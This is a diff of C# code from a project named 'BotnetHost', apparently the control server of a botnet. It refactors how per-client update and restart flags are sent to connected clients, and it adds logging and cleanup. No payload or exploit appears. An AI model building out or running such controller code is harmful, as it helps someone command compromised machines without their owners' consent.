@@ -28,7 +28,6 @@ namespace BotnetHost
         Boolean runServer = false;
         string previousLogMessage = "";
         Boolean restartClients = false;
-        Boolean hasUpdate = false;
 
         /// <summary>
         /// MainPanel Function, this is the constuctor for the window
@@ -48,13 +47,12 @@ namespace BotnetHost
         }
 
         /// <summary>
-        /// Client Socket Thread Function
+        /// Client Socket Thread Function, this gets ran for every connected client
         /// </summary>
         /// <param name="clientGUID">GUID of ClientConnection that this thread is responsible for</param>
         public void clientSocketThread(string clientUID)
         {
             ClientConnection clientConnection = null;
-            Thread clientThread = null;
             Boolean runThread = false;
 
             // Loop through client connections to find matching cliengGUID
@@ -64,6 +62,7 @@ namespace BotnetHost
                 {
                     try
                     {
+                        log("Client thread started for " + connection.clientName + "...");
                         // matching GUID found, this is our desired connection
                         clientConnection = connection;
                         runThread = true;
@@ -75,12 +74,6 @@ namespace BotnetHost
             // Infinite loop while client is running
             while (runThread)
             {   
-                hasUpdate = false;
-                updateStatusLabel.Invoke((MethodInvoker)delegate {
-                    // Running on the UI thread
-                    hasUpdate = Boolean.Parse(updateStatusLabel.Text);
-                    updateStatusLabel.Text = "False";
-                });
                 try
                 {
                     // Wait for incomming message from client
@@ -118,12 +111,17 @@ namespace BotnetHost
                     }
 
                     // Send update message to client (if update is present)
-                    if (hasUpdate)
+                    if (clientConnection.hasUpdate)
                     {
                         log("Sending Client Update: " + clientConnection.buildUpdate(new string[0]));
                         byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate(new string[0]));
                         clientConnection.clientSocket.Send(message);
                         clientConnection.restart = false;
+                        clientConnection.hasUpdate = false;
+                        updateStatusLabel.Invoke((MethodInvoker)delegate {
+                            // Running on the UI thread
+                            updateStatusLabel.Text = "False";
+                        });
                     } else
                     {
                         // Ping clients (check that they are still connected)
@@ -148,13 +146,18 @@ namespace BotnetHost
                     runThread = false;
                 }
             }
+
             // Kill client
+            try
+            {
+                clientConnection.killClient();
+            } catch (Exception e) { }
+            // Remove connection from list and refresh list
             try
             {
                 clientConnections.Remove(clientConnection);
             }
             catch (Exception e) { }
-            clientConnection.killClient();
             updateClientPanel();
         }
 
@@ -237,7 +240,7 @@ namespace BotnetHost
         }
 
         /// <summary>
-        /// log() function, used to display log messages to the user
+        /// log() function, used to display log messages to the user & write to log.txt
         /// </summary>
         /// <param name="logMessage">Message to be displayed to user</param>
         public void log(string logMessage)
@@ -332,6 +335,7 @@ namespace BotnetHost
                 {
                     clientConnection.restart = restartClients;
                 }
+                clientConnection.hasUpdate = true;
             }
             updateStatusLabel.Text = "True";
         }
@@ -588,7 +592,7 @@ namespace BotnetHost
                     if (connection.clientName == selectedClientName)
                     {
                         connection.restart = true;
-                        hasUpdate = true;
+                        connection.hasUpdate = true;
                         settingsChanged(sender, e);
                         updateClientPanel();
                     }
